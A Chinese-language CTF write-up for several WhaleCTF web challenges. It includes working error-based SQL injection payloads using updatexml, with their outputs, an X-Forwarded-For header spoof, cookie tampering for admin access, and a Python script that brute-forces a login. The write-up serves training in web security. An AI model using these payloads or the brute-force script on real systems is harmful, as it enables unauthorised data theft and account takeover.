---
title: whalectf_web
date: 2019-03-12 15:16:19
tags:
    - CTF
categories:
    - CTF
    - writeup
---
### SQL注入[](http://codeqi.top/2018/02/05/WhaleCTF-WriteUp/#sql注入)

首先，我们输入1，返回正常页面

然后我们在输入1’，报错

```bash
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```
<!--more-->
可以看出，这题我们不需要去闭合引号啥的

接着，我们利用order by语句，查询列数

```bash
1 order by 1
```

最终得到一共有4列

接着进入正题，我们这里使用xmlupdate的报错注入

**1\. 查询数据库名**

```
1 and updatexml(1,concat(0x7e,(mid((select database()),1,31))),1)

```

提交，成功得到数据库名

```
XPATH syntax error: '~sqli'

```

**2\. 查询表名**

```
1 and updatexml(1,concat(0x7e,(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,31))),1)
```

提交得到

```
XPATH syntax error: '~flag'

```

很显然，这就是flag所在的表

**3\. 查询列名**

```
1 and updatexml(1,concat(0x7e,(mid((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,31))),1)

```

提交得到

```
XPATH syntax error: '~flag'

```

也很显然，flag肯定在这一列

**4\. 查询字段**

```
1 and updatexml(1,concat(0x7e,(mid((select flag from flag limit 0,1),1,31))),1)

```

提交得到

```
XPATH syntax error: '~abcd1234'

```

根据题目要求，flag{abcd1234}

### Find me[](http://codeqi.top/2018/02/05/WhaleCTF-WriteUp/#find-me)

查看源代码

在注释中找到flag:{This_is_s0_simpl3}

### http呀[](http://codeqi.top/2018/02/05/WhaleCTF-WriteUp/#http呀)

burpsuit抓包发现没有数据包，猜测不是这个页面，html改成php,发现还是跳转到html

用curl看一下index.php返回结果

```
qiqi@qiqi-Mac ~> curl http://39.107.92.230/web/web2/index.php
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Careful</title>
</head>
<body alink="#007000"  bgcolor="#000000" link="gold" text="#008000" vlink="#00c000">
<center>
<br><br>
<center>
<h1>Do you know what happend just now?!</h1>
<script>
window.location.href="index.html";
</script>
</center>
<br>
<br>
<br>
<!--flag:{Y0u_ar3_s0_Car3ful}-->
</html>

```

这样我们就得到了flag:{Y0u_ar3_s0_Car3ful}

### 本地登陆[](http://codeqi.top/2018/02/05/WhaleCTF-WriteUp/#本地登陆)

题目要求本地登陆，我们很容易想到XFF头

所以抓包添加XFF头部

X-Forwarded-For: 127.0.0.1

得到新的提示：You are not admin.Get out!

于是我们还要将isadmin的值改为1

最终成功得到flag:{Why_ar3_y0u_s0_dia0}

### 密码泄露[](http://codeqi.top/2018/02/05/WhaleCTF-WriteUp/#密码泄露)

查看源代码，发现password.txt文件，发现里面有很多密码，但我们不可能一个一个去试

直接上python

```python
import requests
url = "http://39.107.92.230/web/web5/password.txt"
r = requests.get(url)
res = r.text.split('\r\n')
for i in res:
  r = requests.post("http://39.107.92.230/web/web5/index.php", data={'username':'admin', 'password':i})
  if "False" not in r.text:
    print i
    break

```
或者将获得的字典加载到burpsuit中暴力破解
得到密码：Nsf0cuS

输入，进入新页面，说这里没有flag

我们打开开发者工具，在Network选项中，我们在cookie一栏，看到newpage，后面是一串很像base64编码的字符，解码得到290bca70c7dae93db6644fa00b9d83b9.php

进入页面，提示要以小黑的身份留言

于是抓包

将IsLogin的值改为1

一开始尝试把userlevel改为admin，后来发现应该改为root

发送请求，在Set-Cookie头部看到Flag=flag%7BC0ngratulati0n%7D

URL编码解码得到flag{C0ngratulati0n}

